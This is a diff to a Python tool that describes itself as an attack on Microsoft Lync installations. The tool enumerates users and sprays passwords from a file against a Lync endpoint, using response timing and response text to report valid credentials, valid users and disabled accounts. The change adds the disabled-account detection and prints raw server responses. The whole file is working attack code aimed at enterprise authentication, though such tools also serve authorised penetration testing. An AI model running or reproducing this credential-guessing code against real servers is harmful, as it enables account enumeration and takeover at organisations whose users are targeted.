@@ -21,7 +21,8 @@ except:
         pass
 
 validCred = False
-timeout = 0
+isDisabled = False
+timeout = 1.00
 
 def main():
         parser = argparse.ArgumentParser(description='Attack Microsoft Lync installations')
@@ -66,12 +67,12 @@ def main():
 
 
                                 if (args.passwd != None):
-                                    timing_attack(args.host.rstrip(), args.usernames.rstrip(), args.passwd.rstrip(), args.domain.rstrip()) 
+                                    timing_attack(args.host.rstrip(), args.usernames.rstrip(), args.passwd.rstrip(), args.domain.rstrip())
 
                                 if (args.passwdfile != None):
                                     with open(args.passwdfile) as pass_file:
                                         for password in pass_file:
-                                            timing_attack(args.host.rstrip(), args.usernames.rstrip(), password.rstrip(), args.domain.rstrip()) 
+                                            timing_attack(args.host.rstrip(), args.usernames.rstrip(), password.rstrip(), args.domain.rstrip())
 
                                     pass_file.close()
 
@@ -144,11 +145,14 @@ def timing_attack(host,userfilepath,password,domain):
              print_status("Time for {0}: {1}".format(user.rstrip(), response_time))
              candidatevalue=float(float(response_time)/timeout)
              if candidatevalue <= float("0.4"):
-                 if validCred:
-                     print_good("VALID CREDENTIALS: {0}:{1}".format(user, password))
+                 if isDisabled:
+                     #print_disabled(user.rstrip())
+                     print_good("Valid User, Account Disabled: {0}".format(user))
+                 elif validCred:
+                     print_good("VALID CREDENTIALS: {0}:{1}".format(user.rstrip(), password.rstrip()))
                  else:
                      print_good("Valid User, Invalid Password: {0}".format(user))
-             print ''
+             #print ''
     user_file.close()
 
 
@@ -178,6 +182,7 @@ def baseline_timeout(host, domain):
 # Send Lync request
 def send_xml(host, domain, user, passwd):
         global validCred
+        global isDisabled
         domain_user = "{0}\\{1}".format(domain, user)
         encoded_username = base64.b64encode(domain_user.encode('ascii'))
         encoded_password = base64.b64encode(passwd.encode('ascii'))
@@ -192,7 +197,14 @@ def send_xml(host, domain, user, passwd):
                 webholder = requests.post(lync_url, headers=headers, data=xml_data, verify=False)
                 if 'No valid' in webholder.text:
                     validCred = False
+                    isDisabled = False
+		elif 'account is disabled' in webholder.text:
+                    validCred = False
+                    isDisabled = True
+                    #print_disabled(domain_user.rstrip())
                 else:
+                    isDisabled = False
+                    print_status(webholder.text)
                     validCred = True
                 response_time = str(webholder.elapsed.total_seconds())
                 status_code = webholder.status_code
@@ -214,7 +226,7 @@ def send_xml(host, domain, user, passwd):
         return response_time
 
 def print_success(username,password):
-        print("\033[1m\033[32m[WOOT]\033[0m RETURNED STATUS 200: POSSIBLE USER {0} with PASS {1}".format(username,password))
+        print("\033[1m\033[32m[+]\033[0m RETURNED STATUS 200: POSSIBLE USER {0} with PASS {1}".format(username,password))
 
 def print_error(msg):
         print("\033[1m\033[31m[-]\033[0m {0}".format(msg))
